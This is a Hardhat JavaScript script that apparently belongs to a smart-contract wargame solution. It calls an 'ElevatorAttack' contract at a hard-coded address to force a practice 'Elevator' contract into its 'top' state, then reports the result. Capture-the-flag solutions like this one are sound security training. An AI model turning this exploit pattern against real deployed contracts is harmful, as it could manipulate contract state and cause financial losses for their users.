const hre = require("hardhat");

async function main() {
  // Fetch account
  const [attacker] = await hre.ethers.getSigners();
  const INSTANCE_ADDRESS = "0x81fb5065A47C77B74A9Dc5281a94dFe17509073C";
  const ATTACKER_ADDRESS = "0xDc93A5ae295e9EE353DebFfCF211100A797C88d3";

  // Fetch attack contract
  const elevator = await hre.ethers.getContractAt("Elevator", INSTANCE_ADDRESS);
  const elevatorAttack = await hre.ethers.getContractAt("ElevatorAttack", ATTACKER_ADDRESS);

  console.log(`Elevator contract fetched at ${elevator.address}\n`);
  console.log(`ElevatorAttack contract fetched at ${elevatorAttack.address}\n`);

  // Attack...
  let transaction = await elevatorAttack.connect(attacker).callGoTo();
  await transaction.wait();

  console.log(`Attack complete...\n`);

  const ELEVATOR_STATUS = await elevator.top();
  console.log(`Have we reached the top? ${ELEVATOR_STATUS}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});